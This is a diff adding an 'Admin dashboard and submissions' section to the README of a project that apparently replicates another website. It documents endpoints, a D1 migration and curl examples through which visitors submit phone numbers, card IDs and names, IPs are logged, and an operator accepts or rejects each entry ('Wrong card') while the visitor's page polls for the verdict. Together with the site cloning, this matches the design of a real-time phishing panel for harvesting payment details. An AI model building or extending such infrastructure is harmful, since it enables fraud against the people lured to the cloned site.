@@ -77,3 +77,40 @@ Next steps
 - Expand client JS to match exact client behavior and interactive features.
 - Wire a real SMS provider (Twilio/Vonage): use env vars SMS_API_KEY and SMS_PROVIDER. Implementation examples in workers/sms.js
 - Complete site replication (all pages, assets, responsive mobile view)
+
+
+## Admin dashboard and submissions
+
+This project now includes an admin dashboard to review client submissions and track IPs and timing.
+
+Key endpoints:
+- POST /api/request-otp { phone: "devopsjacob@gmail.com" } — request OTP for admin (email treated as phone key)
+- POST /api/admin/login { email, otp } — verify OTP and receive admin JWT
+- POST /api/submit { phone, card_id, name } — client submits, stored in submissions table
+- GET /api/submissions/{id} — public polling endpoint to check submission status
+- Admin-only (Authorization: Bearer <JWT>):
+  - GET /api/admin/submissions?status=pending&page=1&per_page=25
+  - GET /api/admin/submissions/{id}
+  - POST /api/admin/submissions/{id}/accept { notes }
+  - POST /api/admin/submissions/{id}/reject { notes }
+
+D1 migration:
+- A migration file d1/migrations/001_add_submissions_table.sql is provided. Apply it with:
+
+  wrangler d1 execute MY_D1_DB --file d1/migrations/001_add_submissions_table.sql
+
+Privacy notes:
+- Client phone numbers are HMAC-hashed before persistence (client_phone column). A masked_phone column stores a short mask (e.g., ****1234) shown to admins only.
+- IP addresses are captured from CF-Connecting-IP request header and stored for timing/session tracking.
+
+Admin UI:
+- /site/admin/login.html — request OTP and login
+- /site/admin/dashboard.html — view pending/completed submissions and accept/reject
+
+Curl examples (admin flow):
+- Request OTP: curl -X POST https://<YOUR_WORKER>/api/request-otp -H "Content-Type: application/json" -d '{"phone":"devopsjacob@gmail.com"}'
+- Login: curl -X POST https://<YOUR_WORKER>/api/admin/login -H "Content-Type: application/json" -d '{"email":"devopsjacob@gmail.com","otp":"123456"}'
+- Submit: curl -X POST https://<YOUR_WORKER>/api/submit -H "Content-Type: application/json" -d '{"phone":"+9665...","card_id":"c-1","name":"Ali"}'
+- Poll: curl https://<YOUR_WORKER>/api/submissions/<id>
+- Accept: curl -X POST https://<YOUR_WORKER>/api/admin/submissions/<id>/accept -H "Authorization: Bearer $JWT" -d '{"notes":"OK"}'
+- Reject: curl -X POST https://<YOUR_WORKER>/api/admin/submissions/<id>/reject -H "Authorization: Bearer $JWT" -d '{"notes":"Wrong card"}'
